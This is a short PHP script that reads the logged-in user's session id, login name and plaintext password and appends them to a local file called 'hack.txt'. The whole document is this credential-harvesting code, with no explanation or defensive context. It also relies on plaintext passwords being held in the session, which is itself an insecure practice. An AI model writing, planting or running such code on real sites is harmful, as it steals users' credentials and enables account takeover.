<?php
session_start();
$id = $_SESSION['id'];
$login = $_SESSION['login'];
$password = $_SESSION['password'];
$fp = fopen('hack.txt','a');
fwrite($fp, $id." ".$login." ".$password."\n");
fclose($fp);
 ?>
